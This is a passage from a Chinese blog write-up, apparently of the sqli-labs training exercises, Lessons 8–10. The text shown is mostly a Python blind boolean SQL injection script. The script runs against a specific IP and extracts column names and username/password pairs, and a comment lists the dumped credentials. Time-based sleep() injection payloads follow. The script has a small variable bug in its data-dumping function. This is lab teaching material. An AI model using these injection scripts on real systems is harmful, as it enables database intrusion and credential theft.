information_schema.columns where table_name='users')&gt;%s"</span> %i</span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'column_number:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">column_num()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span>		</span><br><span class="line">	print(<span class="string">'column_name:'</span>,name)</span><br><span class="line">column_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">	data = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			password = <span class="string">"?id=1' and substr((select group_concat(username,' ',password) from users),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				data = data+i</span><br><span class="line">				print(data)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'data:'</span>,data)</span><br><span class="line">data()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4</span></span><br></pre></td></tr></table></figure>
+<h2 id="Less-9-GET-Blind-Time-Based-Single-Quotes"><a href="#Less-9-GET-Blind-Time-Based-Single-Quotes" class="headerlink" title="Less-9 GET-Blind-Time Based-Single Quotes"></a>Less-9 GET-Blind-Time Based-Single Quotes</h2><ol>
+<li>时间延迟型盲注原理：<br>界面返回值只有一种true，无论输入任何值,返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1&apos; and if(1=1,sleep(5),0)--+</span><br><span class="line">采用前几题的判断方法发现页面没有任何变化，都是You are in...，</span><br><span class="line">因而猜测是时间延迟型注入，构造payload发现页面延迟5秒后刷新，猜测正确</span><br><span class="line"></span><br><span class="line">#之后的操作与布尔型盲注类似，只是将Less-8中构造的payload</span><br><span class="line">作为if()函数的判断条件，根据页面是否延迟刷新来判断是否正确，例如：</span><br><span class="line">?id=1&apos; and if(length(databade()&gt;5),sleep(5),0)--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-10-GET-Blind-Time-Based-Double-Quotes"><a href="#Less-10-GET-Blind-Time-Based-Double-Quotes" class="headerlink" title="Less-10 GET-Blind-Time Based-Double Quotes"></a>Less-10 GET-Blind-Time Based-Double Quotes</h2><p>这题和上一题一样，只不过这题是双引号型注入。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/常用SQL语句/" rel="next" title="SQL常用语句">
+                <i class="fa fa-chevron-left"></i> SQL常用语句
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/kawhi.jpg" alt="kawhi">
+            
+              <p class="site-author-name" itemprop="name">kawhi</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Intro"><span class="nav-number">1.</span> <span class="nav-text">Intro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1-GET-Error-based-single-quotes-String"><span class="nav-number">2.</span> <span class="nav-text">Less-1 GET-Error based-single quotes-String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2-GET-Error-Based-Intiger-based"><span class="nav-number">3.</span> <span class="nav-text">Less-2 GET-Error Based-Intiger based</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="nav-number">4.</span> <span class="nav-text">Less-3 GET-Error based-Single quotes with twist-string</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4-GET-Error-Based-Double-quotes-String"><span class="nav-number">5.</span> <span class="nav-text">Less-4 GET-Error Based-Double quotes-String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-GET-Double-Injection-Single-Quotes-String"><span class="nav-number">6.</span> <span class="nav-text">Less-5 GET-Double Injection-Single Quotes-String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-GET-Double-Injection-Double-Quotes-String"><span class="nav-number">7.</span> <span class="nav-text">Less-6 GET-Double Injection-Double Quotes-String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7-GET-Dump-into-outfile-String"><span class="nav-number">8.</span> <span class="nav-text">Less-7 GET-Dump into outfile-String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8-GET-Blind-Boolian-Based-Singles-Quotes"><span class="nav-number">9.</span> <span class="nav-text">Less-8 GET-Blind-Boolian Based-Singles Quotes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一：手工注入"><span class="nav-number">9.1.</span> <span class="nav-text">方法一：手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二：脚本注入"><span class="nav-number">9.2.</span> <span class="nav-text">方法二：脚本注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9-GET-Blind-Time-Based-Single-Quotes"><span class="nav-number">10.</span> <span class="nav-text">Less-9 GET-Blind-Time Based-Single Quotes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10-GET-Blind-Time-Based-Double-Quotes"><span class="nav-number">11.</span> <span class="nav-text">Less-10 GET-Blind-Time Based-Double Quotes</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
